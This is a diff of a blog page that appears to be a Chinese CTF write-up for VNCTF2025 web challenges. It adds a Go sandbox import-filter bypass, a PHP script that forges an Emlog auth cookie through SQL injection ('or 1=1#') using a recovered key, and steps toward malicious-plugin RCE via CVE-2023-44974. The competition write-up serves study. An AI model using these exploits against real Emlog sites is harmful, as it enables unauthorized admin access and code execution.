@@ -48,8 +48,12 @@
 <meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250210161426050.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250210161242617.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250210161342127.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211213625630.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214340591.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214831024.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214930685.png">
 <meta property="article:published_time" content="2025-02-08T16:46:20.000Z">
-<meta property="article:modified_time" content="2025-02-10T08:36:02.319Z">
+<meta property="article:modified_time" content="2025-02-12T07:59:44.092Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="比赛">
 <meta name="twitter:card" content="summary_large_image">
@@ -249,7 +253,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2.6k 字
+          2.8k 字
         
       </span>
     
@@ -260,7 +264,7 @@
         
         
         
-          22 分钟
+          24 分钟
         
       </span>
     
@@ -361,6 +365,9 @@
 
 <p>如果admin身份进入沙箱，这里会匹配<code>os/exec</code>，不让你外部执行命令。</p>
 <p>但是根本难不倒他，<code>syscall</code>也能打。</p>
+<p>其实细心一点看代码，就会发现这里的匹配只匹配了第一个import，意思就是你import两次第二次他根本就不检查，太难绷了……</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;os/exec&quot;</span><br>)<br></code></pre></td></tr></table></figure>
+
 <p>而读取到key.go后，我们能直接拿本地生成的token去套远程环境，因为这里mt_rand伪随机数生成的<code>JWT KEY</code>是唯一的，所以仍然有效。</p>
 <p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010014143.png" srcset="/img/loading.gif" lazyload alt="image-20250210010014143"></p>
 <p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010025744.png" srcset="/img/loading.gif" lazyload alt="image-20250210010025744"></p>
@@ -415,13 +422,24 @@
 <p>回到鉴权逻辑：</p>
 <p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161242617.png" srcset="/img/loading.gif" lazyload alt="image-20250210161242617"></p>
 <p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161342127.png" srcset="/img/loading.gif" lazyload alt="image-20250210161342127"></p>
-<p>显然这里可以构造永真式SQL打个报错注入：</p>
+<p>显然这里可以构造永真式SQL打个报错注入，这里的UA头是网站页面那个博客里给的UA：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$seed</span> = <span class="hljs-number">2430606281</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-variable">$rand_string</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()&quot;</span>;<br><br><span class="hljs-variable">$retStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">32</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$retStr</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rand_string</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rand_string</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$user_agent</span> = <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0&#x27;</span>;<br><span class="hljs-variable">$auth_key</span> = <span class="hljs-variable">$retStr</span>.<span class="hljs-variable">$user_agent</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;AUTH_KEY:&#x27;</span> . <span class="hljs-variable">$auth_key</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;x&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #&quot;</span>;<br><span class="hljs-variable">$expiration</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$auth_key</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> .  <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nEM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$expiration</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$hash</span>;<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">AUTH_KEY:<span class="hljs-title function_ invoke__">yxuzKkM2QC8L8WLPFvawb</span>(mI4R&amp;NglOAMozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">135.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">135.0</span><br>                               <br>EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=x<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #|0|1347191e25f82f5b77b6d5b283ee4064</span><br></code></pre></td></tr></table></figure>
 
 <p>再用得到的用户名生成可用cookie登录后台。</p>
-<p>后续后台上传恶意插件RCE。</p>
+<p>或者用AUTH_KEY生成万能密码直接登录：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateAuthCookie</span>(<span class="hljs-params"><span class="hljs-variable">$user_login</span>, <span class="hljs-variable">$expiration</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">emHash</span>(<span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>);<br>    <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$hash</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">emHash</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">generateAuthCookie</span>(<span class="hljs-string">&quot;&#x27; or 1=1#&quot;</span>, <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211213625630.png" srcset="/img/loading.gif" lazyload alt="image-20250211213625630"></p>
+<p>后续后台上传恶意插件RCE：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/W13680336969/article/details/137267677">Emlog Pro 任意文件上传漏洞（CVE-2023-44974）_emlog v2.2.0后台插件上传漏洞-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yangliukk/emlog/tree/main">yangliukk&#x2F;emlog</a></p>
+<p>压缩包中必须存在一个与压缩包同名的PHP文件，并且上传成功不会返回上传路径。</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214340591.png" srcset="/img/loading.gif" lazyload alt="image-20250211214340591"></p>
+<p>打包上传：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214831024.png" srcset="/img/loading.gif" lazyload alt="image-20250211214831024"></p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214930685.png" srcset="/img/loading.gif" lazyload alt="image-20250211214930685"></p>
 
                 
               </div>
